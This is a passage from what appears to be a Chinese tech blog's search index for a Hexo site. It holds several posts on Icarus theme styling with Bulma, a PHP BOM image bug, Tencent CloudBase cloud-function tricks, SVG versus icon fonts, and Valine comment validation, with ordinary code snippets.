$searchbox-bg-container$searchbox-fg-pagination-item-active ?= findColorInvert($primary)$searchbox-bg-pagination-item-active ?= $primary$searchbox-bg-pagination-item-disabled ?= $searchbox-bg-container.searchbox display: none top: 0 left: 0 width: 100% height: 100% z-index: 100 font-size: 1rem line-height: 0 background: $searchbox-bg-overlay &amp;.show display: flex a, a:hover color: inherit text-decoration: none input font-size: 1rem border: none outline: none box-shadow: none border-radius: 0 &amp;, .searchbox-container position: fixed align-items: center flex-direction: column line-height: 1.25em .searchbox-container z-index: 101 display: flex overflow: hidden box-shadow: $searchbox-box-shadow border-radius: $searchbox-border-radius background-color: $searchbox-bg-container width: $searchbox-container-width top: $searchbox-container-margin bottom: $searchbox-container-margin .searchbox-header, .searchbox-body, .searchbox-footer width: 100% .searchbox-header display: flex flex-direction: row line-height: 1.5em font-weight: normal background-color: $searchbox-bg-input // fix Chrome 71 height issue // https://github.com/ppoffice/hexo-theme-icarus/issues/719 min-height: 3rem .searchbox-input-container display: flex flex-grow: 1 .searchbox-input flex-grow: 1 color: inherit box-sizing: border-box padding: .75em 0 .75em 1.25em background: $searchbox-bg-input .searchbox-close display: inline-block font-size: 1.5em padding: .5em .75em cursor: pointer &amp;:hover background: $searchbox-bg-close-hover &amp;:active background: $searchbox-bg-close-active .searchbox-body flex-grow: 1 overflow-y: auto border-top: 1px solid $searchbox-border .searchbox-result-section header, .searchbox-result-item padding: .75em 1em .searchbox-result-section border-bottom: 1px solid $searchbox-border header color: $searchbox-fg-result-header .searchbox-result-item display: flex flex-direction: row &amp;:not(.disabled):not(.active):not(:active):hover background-color: $searchbox-bg-result-item-hover &amp;:active, &amp;.active color: $searchbox-fg-result-item-active background-color: $searchbox-bg-result-item-active em font-style: normal background: $searchbox-bg-result-item-highlight .searchbox-result-icon margin-right: 1em .searchbox-result-content overflow: hidden .searchbox-result-title, .searchbox-result-preview display: block overflow: hidden white-space: nowrap text-overflow: ellipsis .searchbox-result-title-secondary color: $searchbox-fg-result-item-secondary .searchbox-result-preview margin-top: .25em .searchbox-result-item:not(:active):not(.active) .searchbox-result-preview color: $searchbox-fg-result-item-secondary .searchbox-footer padding: .5em 1em .searchbox-pagination margin: 0 padding: 0 list-style: none text-align: center .searchbox-pagination-item margin: 0 .25rem .searchbox-pagination-item, .searchbox-pagination-link display: inline-block .searchbox-pagination-link overflow: hidden padding: .5em .8em box-shadow: $searchbox-box-shadow border-radius: $searchbox-border-radius background-color: $searchbox-bg-pagination-item .searchbox-pagination-item.active .searchbox-pagination-link color: $searchbox-fg-pagination-item-active background-color: $searchbox-bg-pagination-item-active .searchbox-pagination-item.disabled .searchbox-pagination-link cursor: not-allowed background-color: $searchbox-bg-pagination-item-disabled .searchbox-pagination-item:not(.active):not(.disabled) .searchbox-pagination-link:hover background-color: $searchbox-bg-pagination-item-hover@media screen and (max-width: $searchbox-breakpoint-width), screen and (max-height: $searchbox-breakpoint-height) .searchbox .searchbox-container top: 0 left: 0 width: 100% height: 100% border-radius: 0 感谢xmflswood 提供的 pinyin-match &nbsp;&nbsp; Landscape Vectors by Vecteezy","link":"/2020/icarus-insight-pinyin/"},{"title":"PHP imagepng 输出损坏的图片问题解决","text":"问题发现我和同事的两套本地开发环境，相同的一段返回随机验证码图片的代码，验证码代码参考的是 php实现的Captcha验证码类实例 里的代码。在同事的电脑上调用，出来的是裂开的图片，在我的电脑上调用，出来的就是正常的图片，这是为什么呢？解决这个问题花费了三四个小时，记录一下过程。 解决过程因为代码上没有区别，所以开始怀疑环境问题，两台开发机都是相同型号，配置也相同，PHP 运行在 docker 容器下，检查 PHP 版本相同。 查了一下 PHP 文档，怀疑可能是因为什么特性没有启用，测试以下代码： test.php12345&lt;?phpif (imagetypes() &amp; IMG_PNG) { echo &quot;PNG Support is enabled&quot;;}?&gt; 测试结果 imagetypes() &amp; IMG_PNG 的值大于零，看起来两个环境都是支持 PNG 图的。 比较两台电脑生成的图片，首先用 Notepad++ 打开损坏的图片，发现文件头尾都是正常的。 为了减少干扰因素，我注释掉了随机生成验证码的部分，让两个环境都生成相同的空白图片，然后用 UltraEdit 或其他 16 进制文件编辑器打开。 这时候我才发现了区别，损坏图片开头多出了3个字节，EF BB BF，即我们常说的 UTF-8 BOM。 有了线索就上网查，查到了另一博客 东风无力百花残 的文章 PHP文件头BOM头问题 我刚因为一个愚蠢的问题而损失了大约4个小时。我在本地服务器上的图像以某种方式被损坏，因此没有显示在浏览器中。经过多次环顾和测试，包括多次在我的计算机上重新安装 apache，我将问题追溯到包含的文件。没有问题不是空白，而是 UTF BOM 编码字符在我的一个未被引用的文件的开头…所以，当心你的包含文件！确保它们未在 UTF 中编码，或者在没有物料清单的 UTF 中进行编码。希望它能省下别人的时间。 好的，感谢……等等，我们不太一样，我们用的是 Symfony HttpFoundation 模块做的 API，controller 也都是不包含 BOM 头的呀…… 我也不是很懂 PHP，继续查，又查到了一个 StackOverflow 上的问题 Symfony2 Remove UTF-8 BOM from controller responses 好的，感谢……等等，看回复，最后他是排除了这和 Symfony 的关系，并没有给出解决方案…… 这个文件头到底该怎么去掉啊…… 我在本地试着给 API 的入口点 index.php 文件改成了 UTF-8 With BOM 编码，保持之后，“成功” 把图片搞裂了。 激动地去找同事检查她的 index.php，咦，并没有 BOM。 线索断了…… 最后还是同事自己找到的解决方案，只要换一个思路，我们找不到 BOM 是在何处加上的，也无法保证部署后文件没有 BOM，那就在返回图片流之前，清空缓冲区。 CaptchaUtil.php1234ob_end_clean();ob_clean();...imagepng(...); 问题立即得到解决。 最后还是没想出来 BOM 在哪里出来的……","link":"/2020/php-gd-image-broken/"},{"title":"Icarus 夜间模式支持 3.0 了","text":"原主题Icarus 夜间模式（实验中）如何给 Icarus 增加夜间模式 夜间模式单独提取的代码目前已经更新，支持 Icarus 3.0.0，有需要的朋友欢迎 checkout。 分支：https://github.com/imaegoo/hexo-theme-icarus/tree/night3提交：https://github.com/imaegoo/hexo-theme-icarus/commit/fc3d016ae1c999347bd9ecbf3cc656e1382db06d 1234cd theme/icarusgit remote add imaegoo https://github.com/imaegoo/hexo-theme-icarus.gitgit fetch imaegoogit merge imaegoo/night3","link":"/2020/icarus-night-mode-3/"},{"title":"活用 Bulma 美化 Icarus 文章","text":"Icarus 相信大家都很熟悉，但是有时候我们希望在文章中用特别的样式注明一些内容，markdown 语法就不够用了，所以 Icarus 有哪些高级玩法呢？下面就让 iMaeGoo 带大家一起了解吧。（误 TOC 按钮 进度条 标签页 彩色突出 点击展开代码 你知道的太多了 让简介不出现在正文 封面图来源声明 按钮 进度条 标签页 彩色突出 点击展开代码 你知道的太多了 让简介不出现在正文 封面图来源声明 .post-summary { display: none; } 按钮 Info Success Warning Danger 点击展开代码 >folded123456&lt;div class=&quot;buttons&quot;&gt; &lt;button class=&quot;button is-info&quot;&gt;Info&lt;/button&gt; &lt;button class=&quot;button is-success&quot;&gt;Success&lt;/button&gt; &lt;button class=&quot;button is-warning&quot;&gt;Warning&lt;/button&gt; &lt;button class=&quot;button is-danger&quot;&gt;Danger&lt;/button&gt;&lt;/div&gt; 光有按钮肯定是不行的，一般我们还需要给按钮增加事件，比如点击下面的按钮，可以显示一条一言（Hitokoto）。 显示一言 ↑↑↑ 试着点击“显示一言”！ function showHitokoto (event) { event.target.classList.add('is-loading'); $.ajax({ type: 'GET', url: 'https://v1.hitokoto.cn/', success: function (data) { $('.hitokoto').text(data.hitokoto); event.target.classList.remove('is-loading'); } }); } 点击展开代码 >folded12345678910111213141516&lt;button class=&quot;button is-info&quot; onclick=&quot;showHitokoto(event)&quot;&gt;显示一言&lt;/button&gt;&lt;blockquote class=&quot;hitokoto&quot;&gt;↑↑↑ 试着点击“显示一言”！&lt;/blockquote&gt;&lt;script&gt;function showHitokoto (event) { event.target.classList.add('is-loading'); $.ajax({ type: 'GET', url: 'https://v1.hitokoto.cn/', success: function (data) { $('.hitokoto').text(data.hitokoto); event.target.classList.remove('is-loading'); } });}&lt;/script&gt; 进度条 点击展开代码 >folded12345&lt;progress class=&quot;progress is-info&quot; value=&quot;20&quot; max=&quot;100&quot;&gt;&lt;/progress&gt;&lt;progress class=&quot;progress is-success&quot; value=&quot;40&quot; max=&quot;100&quot;&gt;&lt;/progress&gt;&lt;progress class=&quot;progress is-warning&quot; value=&quot;60&quot; max=&quot;100&quot;&gt;&lt;/progress&gt;&lt;progress class=&quot;progress is-danger&quot; value=&quot;80&quot; max=&quot;100&quot;&gt;&lt;/progress&gt;&lt;progress class=&quot;progress is-info&quot; max=&quot;100&quot;&gt;&lt;/progress&gt; 标签页 Pictures Music Videos Documents Pixabay 是全球知名的图库网站及充满活力的创意社区,拥有上百万张免费正版高清照片素材,涵盖风景、人物、动态、静物等多种分类,你可以在任何地方使用 Pixabay 图库中的素材… 网易云音乐 是一款专注于发现与分享的音乐产品,依托专业音乐人、DJ、好友推荐及社交功能,为用户打造全新的音乐生活。 哔哩哔哩 是国内知名的视频弹幕网站,这里有最及时的动漫新番,最棒的ACG氛围,最有创意的Up主。大家可以在这里找到许多欢乐。 石墨文档 是全新一代云 Office 办公软件,支持多人在线协作编辑文档和表格,独有内容级安全,全过程留痕可追溯。PC 端和移动端全覆盖,随时随地远程办公。即写即存… .content .tabs ul { margin: 0; } .tab-content { display: none; } function onTabClick (event) { var tabTitle = $(event.currentTarget).children('span:last-child').text(); $('.article .content .tab-content').css('display', 'none'); $('.article .content .tabs li').removeClass('is-active'); $('#' + tabTitle).css('display', 'block'); $(event.currentTarget).parent().addClass('is-active'); } 点击展开代码 >folded12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;div class=&quot;tabs is-toggle&quot;&gt;&lt;ul&gt;&lt;li class=&quot;is-active&quot;&gt;&lt;a onclick=&quot;onTabClick(event)&quot;&gt;&lt;span class=&quot;icon is-small&quot;&gt;&lt;i class=&quot;fas fa-image&quot; aria-hidden=&quot;true&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;span&gt;Pictures&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a onclick=&quot;onTabClick(event)&quot;&gt;&lt;span class=&quot;icon is-small&quot;&gt;&lt;i class=&quot;fas fa-music&quot; aria-hidden=&quot;true&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;span&gt;Music&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a onclick=&quot;onTabClick(event)&quot;&gt;&lt;span class=&quot;icon is-small&quot;&gt;&lt;i class=&quot;fas fa-film&quot; aria-hidden=&quot;true&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;span&gt;Videos&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a onclick=&quot;onTabClick(event)&quot;&gt;&lt;span class=&quot;icon is-small&quot;&gt;&lt;i class=&quot;far fa-file-alt&quot; aria-hidden=&quot;true&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;span&gt;Documents&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;{% raw %}&lt;div id=&quot;Pictures&quot; class=&quot;tab-content&quot; style=&quot;display: block;&quot;&gt;{% endraw %}[Pixabay](https://pixabay.com/zh/) 是全球知名的图库网站及充满活力的创意社区,拥有上百万张免费正版高清照片素材,涵盖风景、人物、动态、静物等多种分类,你可以在任何地方使用 Pixabay 图库中的素材...{% raw %}&lt;/div&gt;{% endraw %}{% raw %}&lt;div id=&quot;Music&quot; class=&quot;tab-content&quot;&gt;{% endraw %}[网易云音乐](https://music.163.com/) 是一款专注于发现与分享的音乐产品,依托专业音乐人、DJ、好友推荐及社交功能,为用户打造全新的音乐生活。{% raw %}&lt;/div&gt;{% endraw %}{% raw %}&lt;div id=&quot;Videos&quot; class=&quot;tab-content&quot;&gt;{% endraw %}[哔哩哔哩](https://www.bilibili.com/) 是国内知名的视频弹幕网站,这里有最及时的动漫新番,最棒的ACG氛围,最有创意的Up主。大家可以在这里找到许多欢乐。{% raw %}&lt;/div&gt;{% endraw %}{% raw %}&lt;div id=&quot;Documents&quot; class=&quot;tab-content&quot;&gt;{% endraw %}[石墨文档](https://shimo.im/) 是全新一代云 Office 办公软件,支持多人在线协作编辑文档和表格,独有内容级安全,全过程留痕可追溯。PC 端和移动端全覆盖,随时随地远程办公。即写即存...{% raw %}&lt;/div&gt;{% endraw %}&lt;style type=&quot;text/css&quot;&gt;.content .tabs ul { margin: 0; }.tab-content { display: none; }&lt;/style&gt;&lt;script&gt;function onTabClick (event) { var tabTitle = $(event.currentTarget).children('span:last-child').text(); $('.article .content .tab-content').css('display', 'none'); $('.article .content .tabs li').removeClass('is-active'); $('#' + tabTitle).css('display', 'block'); $(event.currentTarget).parent().addClass('is-active');}&lt;/script&gt; 彩色突出 Icarus 主题以白色的简洁为主，但有时候我们希望在文章中用特别的样式注明一些内容，markdown 语法就不够用了，所以在此分享一下我的高级玩法。 点击展开代码 >folded123{% raw %}&lt;div class=&quot;notification is-info&quot;&gt;{% endraw %}[Icarus](https://blog.zhangruipeng.me/hexo-theme-icarus/) 主题以白色的简洁为主，但有时候我们希望在文章中用**特别的样式**注明一些内容，*markdown* 语法就不够用了，所以在此分享一下我的高级玩法。{% raw %}&lt;/div&gt;{% endraw %} Icarus 主题以白色的简洁为主，但有时候我们希望在文章中用特别的样式注明一些内容，markdown 语法就不够用了，所以在此分享一下我的高级玩法。 点击展开代码 >folded123{% raw %}&lt;div class=&quot;notification is-success&quot;&gt;{% endraw %}[Icarus](https://blog.zhangruipeng.me/hexo-theme-icarus/) 主题以白色的简洁为主，但有时候我们希望在文章中用**特别的样式**注明一些内容，*markdown* 语法就不够用了，所以在此分享一下我的高级玩法。{% raw %}&lt;/div&gt;{% endraw %} Icarus 主题以白色的简洁为主，但有时候我们希望在文章中用特别的样式注明一些内容，markdown 语法就不够用了，所以在此分享一下我的高级玩法。 点击展开代码 >folded123{% raw %}&lt;div class=&quot;notification is-warning&quot;&gt;{% endraw %}[Icarus](https://blog.zhangruipeng.me/hexo-theme-icarus/) 主题以白色的简洁为主，但有时候我们希望在文章中用**特别的样式**注明一些内容，*markdown* 语法就不够用了，所以在此分享一下我的高级玩法。{% raw %}&lt;/div&gt;{% endraw %} Icarus 主题以白色的简洁为主，但有时候我们希望在文章中用特别的样式注明一些内容，markdown 语法就不够用了，所以在此分享一下我的高级玩法。 点击展开代码 >folded123{% raw %}&lt;div class=&quot;notification is-danger&quot;&gt;{% endraw %}[Icarus](https://blog.zhangruipeng.me/hexo-theme-icarus/) 主题以白色的简洁为主，但有时候我们希望在文章中用**特别的样式**注明一些内容，*markdown* 语法就不够用了，所以在此分享一下我的高级玩法。{% raw %}&lt;/div&gt;{% endraw %} Icarus 主题以白色的简洁为主，但有时候我们希望在文章中用特别的样式注明一些内容，markdown 语法就不够用了，所以在此分享一下我的高级玩法。 点击展开代码 >folded123{% raw %}&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;{% endraw %}[Icarus](https://blog.zhangruipeng.me/hexo-theme-icarus/) 主题以白色的简洁为主，但有时候我们希望在文章中用**特别的样式**注明一些内容，*markdown* 语法就不够用了，所以在此分享一下我的高级玩法。{% raw %}&lt;/div&gt;&lt;/article&gt;{% endraw %} Icarus 主题以白色的简洁为主，但有时候我们希望在文章中用特别的样式注明一些内容，markdown 语法就不够用了，所以在此分享一下我的高级玩法。 点击展开代码 >folded123{% raw %}&lt;article class=&quot;message is-success&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;{% endraw %}[Icarus](https://blog.zhangruipeng.me/hexo-theme-icarus/) 主题以白色的简洁为主，但有时候我们希望在文章中用**特别的样式**注明一些内容，*markdown* 语法就不够用了，所以在此分享一下我的高级玩法。{% raw %}&lt;/div&gt;&lt;/article&gt;{% endraw %} Icarus 主题以白色的简洁为主，但有时候我们希望在文章中用特别的样式注明一些内容，markdown 语法就不够用了，所以在此分享一下我的高级玩法。 点击展开代码 >folded123{% raw %}&lt;article class=&quot;message is-warning&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;{% endraw %}[Icarus](https://blog.zhangruipeng.me/hexo-theme-icarus/) 主题以白色的简洁为主，但有时候我们希望在文章中用**特别的样式**注明一些内容，*markdown* 语法就不够用了，所以在此分享一下我的高级玩法。{% raw %}&lt;/div&gt;&lt;/article&gt;{% endraw %} Icarus 主题以白色的简洁为主，但有时候我们希望在文章中用特别的样式注明一些内容，markdown 语法就不够用了，所以在此分享一下我的高级玩法。 点击展开代码 >folded123{% raw %}&lt;article class=&quot;message is-danger&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;{% endraw %}[Icarus](https://blog.zhangruipeng.me/hexo-theme-icarus/) 主题以白色的简洁为主，但有时候我们希望在文章中用**特别的样式**注明一些内容，*markdown* 语法就不够用了，所以在此分享一下我的高级玩法。{% raw %}&lt;/div&gt;&lt;/article&gt;{% endraw %} 活用 Bulma 美化 Icarus 文章 Icarus 主题以白色的简洁为主，但有时候我们希望在文章中用特别的样式注明一些内容，markdown 语法就不够用了，所以在此分享一下我的高级玩法。 点击展开代码 >folded12345{% raw %}&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-header&quot;&gt;{% endraw %}活用 Bulma 美化 Icarus 文章{% raw %}&lt;/div&gt;&lt;div class=&quot;message-body&quot;&gt;{% endraw %}[Icarus](https://blog.zhangruipeng.me/hexo-theme-icarus/) 主题以白色的简洁为主，但有时候我们希望在文章中用**特别的样式**注明一些内容，*markdown* 语法就不够用了，所以在此分享一下我的高级玩法。{% raw %}&lt;/div&gt;&lt;/article&gt;{% endraw %} 点击展开代码点击展开代码 >folded123``` js 点击展开代码 &gt;foldedconsole.log('I love Icarus!');``` 你知道的太多了 .heimu { color: #000; background-color: #000; } .heimu:hover { color: #fff; } iMaeGoo 出自独立游戏 World of Goo 里小粘球的叫声，读作 /ɪ’mæɡu/ 不是爱妹狗啊，在家里电脑还是个大头（CRT）的时候就在玩了，其实头像也是在当时设定的，一直沿用至今。找不到女朋友誓不改头像 点击展开代码 >folded1234567{% raw %}&lt;style type=&quot;text/css&quot;&gt;.heimu { color: #000; background-color: #000; }.heimu:hover { color: #fff; }&lt;/style&gt;{% endraw %}**iMaeGoo** 出自独立游戏 [World of Goo](https://store.steampowered.com/app/22000/) 里小粘球的叫声，读作 /ɪ'mæɡu/ {% raw %}&lt;span class=&quot;heimu&quot;&gt;不是爱妹狗啊&lt;/span&gt;{% endraw %}，在家里电脑还是个大头（CRT）的时候就在玩了，其实头像也是在当时设定的，一直沿用至今。{% raw %}&lt;span class=&quot;heimu&quot;&gt;找不到女朋友誓不改头像&lt;/span&gt;{% endraw %} 让简介不出现在正文我们知道 Hexo 用 可以分隔简介和正文部分，但这样简介也会在正文中出现，如果我们不想让简介部分出现在正文呢？ 点击展开代码 >folded123456789101112131415这里的内容会出现在 **简介和正文**{% raw %}&lt;div class=&quot;post-summary&quot;&gt;{% endraw %}这里的内容只会出现在 **简介**{% raw %}&lt;/div&gt;{% endraw %}&lt;!-- more --&gt;&lt;style type=&quot;text/css&quot;&gt;.post-summary { display: none; }&lt;/style&gt;这里的内容只会出现在 **正文** 封面图来源声明 &nbsp;&nbsp; Vector Landscape Vectors by Vecteezy 点击展开代码 >folded1234&lt;a class=&quot;tag is-dark is-medium&quot; href=&quot;https://www.vecteezy.com/free-vector/vector-landscape&quot; target=&quot;_blank&quot;&gt;&lt;span class=&quot;icon&quot;&gt;&lt;i class=&quot;fas fa-camera&quot;&gt;&lt;/i&gt;&lt;/span&gt;&amp;nbsp;&amp;nbsp;Vector Landscape Vectors by Vecteezy&lt;/a&gt; 这就是关于 Icarus 的高级玩法了，大家有什么想法呢，欢迎在评论区告诉小编一起讨论哦！（不是","link":"/2020/icarus-with-bulma/"},{"title":"腾讯云云开发云函数 之 异步执行，提前返回","text":"云函数的特性是，当 main 函数 return 时，执行进程会被立即冻结。这一点在官方文档Node.js 8 的异步行为中有提到。 对于异步函数，主流程执行完成后，函数实例进程会被冻结，进程中的所有异步任务会暂停执行，直到这个进程被再次唤起。另一方面，如果函数实例进程由于某些原因没被复用（例如更新了函数代码），这个异步流程中的代码就永远不会被执行。 但是有些场景下，云函数需要很长的执行时间，例如，Twikoo 通过 Akismet 检测垃圾评论的过程。按照特性，在检测过程结束前，就不能异步检测，提前返回结果给前端，否则检测进程就会被冻结，导致检测失败。我们只能 await 同步检测，造成请求响应慢，用户体验差。 按照 Java 的习惯，我们会启动新的线程执行长时间的任务，在云函数中怎样实现？ 首先 node.js 想要实现多线程是不可能的，那我们换个思路，可以实现多进程吗？可以通过 “云函数调用云函数” 实现多个云函数进程并发执行吗？可以。 index.js123456789101112try { const isSpam = await app.callFunction({ name: 'twikoo', // 调起另一个云函数进程 data: { event: 'CHECK_SPAM', // 检查垃圾评论 comment // 传入检查的评论数据 } }, { timeout: 300 }) // 设置较短的 timeout 来实现异步 return isSpam.result.isSpam // 如果没有超时，可以直接拿到返回结果} catch (e) { console.log('开始异步检测垃圾评论') // 如果超时了，两个云函数进程也都会正常执行下去} callFunction 提供了请求超时时间的设置，即使请求超时，被调用的云函数也是会继续执行完的。那我们就利用这一点，设置较短的 timeout 来实现异步。这样，用户调起的云函数就能够迅速返回结果，垃圾评论检测就可以在另一个进程中慢慢执行了。 肯定有人会问，想要保护起来这种“异步云函数”，只能内部调用，不能外部调用，该怎么实现？这里也提供一个简单的方法。 index.js1234567891011exports.main = async (event, context) =&gt; { if (!isRecursion(context)) { return // 被外部调用，直接返回 }}// 判断是否为外部调用（即云函数调用云函数）function isRecursion (context) { const envObj = tcb.getCloudbaseContext(context) return envObj.TCB_SOURCE.substr(-3, 3) === 'scf'} 相关完整代码请查看 Twikoo 源码","link":"/2020/tcb-functions-async/"},{"title":"比较 SVG 与字体图标 - 缺点与解决方案","text":"如果要为网站增加矢量图标，其中两个选项是使用 SVG 和使用字体图标，两种方式各有千秋，以下是我个人做的比较。 SVG在阅读这一部分前，可以先参考文章 HTML中嵌入SVG图片的N种方式，了解一下不同的 SVG 嵌入页面的方式。 缺点 解决方案 如果将 SVG 放在静态资源目录，通过路径引用至页面，SVG 将造成额外的 HTTP 请求 在 HTML 中内嵌 &lt;svg&gt; 标签 如果在 HTML 中内嵌 &lt;svg&gt; 标签，HTML 会显得杂乱且无法复用 使用 SVG Inline Loader for Webpack 可以用 require 的方式向 HTML 插入 SVG 图标本身带的颜色（类似 fill=&quot;#ccc&quot;）无法覆盖 移除 SVG 本身的颜色。使用 SVG Inline Loader for Webpack 的 removingTagAttrs 选项，可以在打包时批量去除图标本身的颜色，再通过 CSS fill 覆盖颜色 字体图标 缺点 解决方案 因为字体图标本身是一个字符，所以会受到系统级反锯齿（如 ClearType 和 Retina）影响，导致本来锐利的小尺寸的图标边缘不锐利 使用 font-smooth 样式控制图标的反锯齿，在 Chrome 下测试没有成功，未找到更好的解决办法 当遇到网络较差，或者用户使用了屏蔽网页字体的插件时，图标会变成口口 在字体文件加载完成之前尝试隐藏所有图标 无法显示彩色图标 目前发现有网站是把彩色图标拆分成单色图标，再叠加显示，用 SVG 显然更方便 定位不准 这个大多数前端开发应该都有感触，典型就是复选框和文字标签对不齐，要检查图标的 CSS line-height，vertical-align，letter-spacing，word-spacing，display, 寻找对不齐的原因 维护（增加、删除图标）困难 使用阿里的 iconfont 服务来管理字体图标是很好的办法 对屏幕阅读器等辅助功能不友好 需要做适配，可以参考 Bulletproof Accessible Icon Fonts SVG 在线转 iconfont https://icomoon.io/app/ 图片转网站图标（favicon）工具 https://www.websiteplanet.com/zh-hans/webtools/favicon-generator/ 感谢 Camille Wu 参考文章 Inline SVG vs Icon Fonts [CAGEMATCH] HTML中嵌入SVG图片的N种方式","link":"/2020/svg-vs-icon-font/"},{"title":"腾讯云云开发云函数 之 文件导入功能","text":"背景Twikoo 评论系统要实现导入功能，导入，就需要上传文件。 通过调用云函数，我们能够传递 string、number 等简单的参数，想要上传文件？不太行。 想到云开发环境有一块默认开通的 COS 空间，这块空间允许登录用户上传文件，只要利用这片空间，就可以实现将文件上传给云函数的功能了。 主要思路 前端调用 js-sdk 上传文件，获取到 fileID 前端将 fileID 作为参数，调用云函数 云函数通过 fileID 获取到文件，并解析 前端上传首先需要用户选择文件，先写一个选择文件的 input 和一个上传文件的 button。 vue template12&lt;input type=&quot;file&quot; value=&quot;&quot; ref=&quot;inputFile&quot; /&gt;&lt;button @click=&quot;uploadFile&quot; :disabled=&quot;loading&quot;&gt;开始导入&lt;/button&gt; 再编写上传的方法。 vue script1234567891011121314151617181920212223242526// 获取用户选择的文件const filePath = this.$refs.inputFile.files[0]if (!filePath) { alert('未选择文件') return}try { const result = await this.$tcb.app.uploadFile({ // 由于上传的文件是公有读的，所以并不安全 // 通过使用毫秒时间戳作为文件名，一定程度防止其他用户猜测并下载文件 // 适用于并发不大的场景 cloudPath: `import/${Date.now()}`, filePath, onUploadProgress: (progressEvent) =&gt; { // 通过 SDK 可以获取到上传进度 const percentCompleted = Math.round((progressEvent.loaded * 100) / progressEvent.total) console.log(`已上传 ${percentCompleted}%`) } }) // 获得到上传的 fileID console.log(`上传完成 ${result.fileID}`) // 调用云函数，传递 fileID 给云函数，具体实现略 await importFile(result.fileID)} catch (e) { console.error(e)} 这样一个上传功能就完成了。但我们还需要服务器获取到上传的文件，怎样获得呢？ 云函数下载云函数1234567891011121314// 通过接收到的 fileID 读取云存储中的文件async function readFile (fileId, type, log) { try { const result = await app.downloadFile({ fileID: fileId }) console.log('文件下载成功') const content = result.fileContent.toString('utf8') console.log('文件读取成功') // 删除读取完成的文件，保证不因为公有读而泄露 await app.deleteFile({ fileList: [fileId] }) return content } catch (e) { console.log(`评论文件读取失败：${e.message}`) }} 好了，云函数已经成功取得前端上传的文件内容了，接下来就可以实现导入逻辑了。 本文仅摘部分关键代码解读，完整代码可在 Twikoo 中参考 前端：https://github.com/imaegoo/twikoo/blob/0.3.2/src/view/components/TkAdminImport.vue 云函数：https://github.com/imaegoo/twikoo/blob/0.3.2/src/function/twikoo/index.js#L392 最终实现了下图所示的导入功能（故意上传了一个错误的文件）","link":"/2020/tcb-functions-upload/"},{"title":"Valine 升级 1.4 以及增加判断 “昵称和邮箱不能为空”","text":"如果你和我一样只是想在 1.3.10 原版的基础上增加昵称和邮箱的防空验证，可以直接下划到结尾部分，跳过前半部分的过程记录。 最近经受匿名评论的困扰，计划禁止匿名评论。还有一个原因是《网信办：网站不得向未实名认证的用户提供跟帖评论服务》，咱小小博客也是备过案的（能用国内 CDN 加速太香了），应该注意一下是不是？ 很遗憾，Valine 作者不计划添加这一功能！这让我一度想要换评论系统了……先不谈数据转移，我对比了一下其他评论系统—— Discuz 系，国内连通率堪忧，不行； 基于 GitHub Issue 的，需要 GitHub 授权，对访客不是很友好，国内速度也不快，不行； 还有国内的畅言，要备案好说，但是 UI 不好看，还要验证访客手机号、绑定微信一大堆，麻烦不说，重要的是泄露访客隐私，不行…… 昨天发现 Valine 1.4 发布，有几个新特性挺喜欢，打算升级，想起这茬，干脆一起把防空校验加上吧！ xCss/Valine/src/index.js123456789101112131415161718const requiredField = ['nick', 'mail'];let emptyFieldName = [];requiredField.forEach((requiredField) =&gt; { if (defaultComment[requiredField] == '') { emptyFieldName.push(root.locale['head'][requiredField]); }});if (emptyFieldName.length &gt; 0) { root.alert.show({ type: 0, // 昵称不能为空...ヾ(๑╹◡╹)ﾉ&quot; // 邮箱不能为空...ヾ(๑╹◡╹)ﾉ&quot; // 昵称和邮箱不能为空...ヾ(๑╹◡╹)ﾉ&quot; text: `${emptyFieldName.join(root.locale['tips']['and'])}${root.locale['tips']['canNotBeEmpty']}ヾ(๑╹◡╹)ﾉ&quot;`, ctxt: root.locale['ctrl']['ok'] }); return;} 这只是关键部分，完整 diff 详见：https://github.com/imaegoo/Valine/commit/c18515593f16454833c757c91540ef5af0770fa5 后台验证暂时没研究出，LeanCloud 支持字段设置 “不能为空”，但依然不能阻止插入空字符串，文档中还没查到怎么给字符串验证。 写完了编译试一下，就掉进坑里了，Valine 1.4.4 版本通过源码 build 出的 js 报错 Cannot redefine property: applicationId，需要看看作者怎么说。 无奈切回 1.3.10，加上自己的代码，测试一下，成功！ 测通之后已经 26:30 了，教程晚会再写吧，目前还有后台验证和 1.4 升级的坑没有解决，如果你喜欢，欢迎留言，教程更新后我会邮件告知 o(￣▽￣)ブ 2020/4/12 17:20 更新遗憾地，@MHuiG 告知我 1.4.4 并没有开源。同日，作者也在 README 中提到： 由于某些原因，src目录将从v1.4.0后暂停更新.For some reason, the src directory will be suspended from updating after v1.4.0. 所以暂时放弃升级 1.4 的计划，也就不再对 1.4 增加判空功能了。 我修改过的 Valine 在 Github 开源：https://github.com/imaegoo/Valine/tree/imaegoo/1.3.10 2020/4/14 08:20 更新使用方法如果你用的是 Icarus 3.0 主题，你可以创建 themes/icarus/layout/comment/valine.jsx 来覆盖原版主题的 Valine 组件。 点击展开 themes/icarus/layout/comment/valine.jsx >folded123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121/** * Valine comment JSX component. * @module view/comment/valine * @author ppoffice */const { Component, Fragment } = require('inferno');const { cacheComponent } = require('hexo-component-inferno/lib/util/cache');/** * Valine comment JSX component. * * @see https://valine.js.org/quickstart.html * @example * &lt;Valine * appId=&quot;******&quot; * appKey=&quot;******&quot; * notify={false} * verify={false} * placeholder=&quot;******&quot; * avatar=&quot;mm&quot; * avatarForce={false} * meta={['nick', 'mail', 'link']} * pageSize={10} * visitor={false} * highlight={true} * recordIp={false} * jsUrl=&quot;/path/to/Valine.js&quot; /&gt; */class Valine extends Component { render() { 